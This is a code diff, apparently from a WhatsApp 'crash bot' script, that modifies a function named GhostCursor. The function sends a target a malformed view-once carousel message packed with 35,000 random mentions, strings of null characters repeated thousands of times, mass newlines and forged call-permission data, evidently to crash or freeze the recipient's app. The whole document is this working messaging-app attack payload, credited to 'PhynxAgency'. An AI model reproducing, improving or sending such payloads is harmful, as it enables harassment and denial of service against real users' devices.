@@ -1333,13 +1333,12 @@ async function FC3(sock, target, mention) {
 
 async function GhostCursor(sock, target) {
   const mentionedList = [
-    "5521992999999@s.whatsapp.net",
-    "696969696969@s.whatsapp.net",
-    ...Array.from({ length: 35 * 1000 }, () =>
-      `92${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-    )
-  ];
-
+        "696969696969@s.whatsapp.net",
+        ...Array.from({ length: 35000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+    
   const msg = await generateWAMessageFromContent(target, {
     viewOnceMessage: {
       message: {
@@ -1348,15 +1347,15 @@ async function GhostCursor(sock, target) {
           deviceListMetadataVersion: 2
         },
         interactiveMessage: {
-          body: {
-            text: '\u0000'.repeat(9999)
+          body: { 
+            text: '' 
           },
-          footer: {
-            text: '\u0000'.repeat(9999)
+          footer: { 
+            text: '' 
           },
           carouselMessage: {
             cards: [
-              {
+              {               
                 header: {
                   title: '\u0000'.repeat(9999),
                   imageMessage: {
@@ -1370,47 +1369,35 @@ async function GhostCursor(sock, target) {
                     fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                     directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                     mediaKeyTimestamp: "1749172037",
-                    jpegThumbnail: "PhynxAgency",
+                    jpegThumbnail: null,
                     scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                     scanLengths: [8596, 155493]
                   },
-                  hasMediaAttachment: true,
+                  hasMediaAttachment: true, 
                 },
-                body: {
+                body: { 
                   text: "\u0000".repeat(9999)
                 },
                 footer: {
                   text: "\u0000".repeat(9999)
                 },
                 nativeFlowMessage: {
-                  messageParamsJson: "\u0000".repeat(9999),
+                  messageParamsJson: "\n".repeat(10000),
                   buttons: [
-                    {
-                      name: "single_select",
-                      buttonParamsJson: JSON.stringify({
-                        status: true,
-                        criador: "PhynxAgency",
-                        versao: "@latest",
-                        atualizado: "9999-99-99",
-                        suporte: "https://wa.me/status?photo",
-                        comandosDisponiveis: ["-"],
-                        prefixo: ".",
-                        linguagem: "USA"
-                      })
-                    }, {
-                      name: "call_permission_request",
-                      buttonParamsJson: JSON.stringify({
-                        status: true,
-                        criador: "PhynxAgency",
-                        versao: "@latest",
-                        atualizado: "9999-99-99",
-                        suporte: "https://wa.me/status?photo",
-                        comandosDisponiveis: ["-"],
-                        prefixo: ".",
-                        linguagem: "USA"
-                      })
-                    }
-                  ]
+                  {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({ 
+              status: true, 
+              criador: "PhynxAgency", 
+              versao: "@latest", 
+              atualizado: "2025-06-07",  
+              suporte: "https://wa.me/status?video", 
+              comandosDisponiveis: ["-"], 
+              prefixo: ".", 
+              linguagem: "USA" 
+                            })
+                        }
+                    ]
                 }
               }
             ]
@@ -1419,14 +1406,6 @@ async function GhostCursor(sock, target) {
             participant: target,
             stanzaId: "ABCDEF1234567890",
             mentionedJid: mentionedList,
-            forwardingScore: 9999999,
-            isForwarded: true,
-            forwardedNewsletterMessageInfo:
-            {
-              newsletterName: "ꦾ".repeat(100),
-              newsletterJid: "1@newsletter",
-              serverMessageId: 1
-            },
             quotedMessage: {
               viewOnceMessage: {
                 message: {
@@ -1437,7 +1416,7 @@ async function GhostCursor(sock, target) {
                     },
                     nativeFlowResponseMessage: {
                       name: "call_permission_request",
-                      paramsJson: JSON.stringify({ status: true }),
+                      paramsJson: JSON.stringify({ status: true}),
                       version: 3
                     }
                   }
@@ -1475,6 +1454,7 @@ async function GhostCursor(sock, target) {
     ]
   });
 }
+
 
 /* 
     • Credits:
